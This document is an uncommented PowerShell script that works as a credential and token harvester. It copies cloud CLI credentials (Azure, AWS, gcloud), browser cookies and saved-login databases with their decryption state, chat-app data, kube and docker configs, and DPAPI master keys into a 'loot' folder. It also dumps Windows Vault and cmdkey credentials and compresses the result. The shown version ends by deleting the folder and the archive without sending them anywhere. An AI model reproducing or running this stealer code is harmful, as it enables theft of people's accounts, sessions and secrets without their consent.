$lootDir = "$env:TEMP\tkn_$((Get-Random -Max 9999))"
New-Item -ItemType Directory -Path $lootDir -Force | Out-Null

$targets = @(
    "$env:LOCALAPPDATA\Microsoft\TokenBroker\Cache",
    "$env:LOCALAPPDATA\Microsoft\.IdentityService\msal.cache",
    "$env:USERPROFILE\.azure\msal_token_cache.json",
    "$env:USERPROFILE\.azure\azureProfile.json",
    "$env:USERPROFILE\.azure\accessTokens.json",
    "$env:USERPROFILE\.aws\credentials",
    "$env:USERPROFILE\.aws\config",
    "$env:APPDATA\gcloud\credentials.db",
    "$env:APPDATA\gcloud\application_default_credentials.json",
    "$env:APPDATA\gcloud\access_tokens.db",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State",
    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Cookies",
    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
    "$env:APPDATA\Slack\storage\slack-downloads",
    "$env:APPDATA\Microsoft\Teams\Cookies",
    "$env:APPDATA\discord\Local Storage\leveldb",
    "$env:APPDATA\Signal\config.json",
    "$env:USERPROFILE\.kube\config",
    "$env:USERPROFILE\.docker\config.json"
)

foreach ($p in $targets) {
    if (Test-Path $p) {
        try { Copy-Item $p (Join-Path $lootDir (Split-Path $p -Leaf)) -Force -Recurse -ErrorAction Stop } catch {}
    }
}

$dpapiPath = "$env:APPDATA\Microsoft\Protect"
if (Test-Path $dpapiPath) {
    Get-ChildItem $dpapiPath -Directory -ErrorAction SilentlyContinue | ForEach-Object {
        Get-ChildItem $_.FullName -File -ErrorAction SilentlyContinue | ForEach-Object {
            try { Copy-Item $_.FullName (Join-Path $lootDir "dpapi_$($_.Name)") -Force -ErrorAction Stop } catch {}
        }
    }
}

$vaultcmd = Get-Command vaultcmd.exe -ErrorAction SilentlyContinue
if ($vaultcmd) {
    & vaultcmd.exe /list 2>&1 | Out-File (Join-Path $lootDir "vaults.txt") -Force
    & vaultcmd.exe /listcreds:"Windows Credentials" /all 2>&1 | Out-File (Join-Path $lootDir "win_creds.txt") -Force
    & vaultcmd.exe /listcreds:"Web Credentials" /all 2>&1 | Out-File (Join-Path $lootDir "web_creds.txt") -Force
}

& cmdkey.exe /list 2>&1 | Out-File (Join-Path $lootDir "cmdkey_creds.txt") -Force

$archive = "$env:TEMP\cloud_tokens.zip"
try { Compress-Archive -Path "$lootDir\*" -DestinationPath $archive -Force -ErrorAction Stop } catch {}

Remove-Item $lootDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $archive -Force -ErrorAction SilentlyContinue
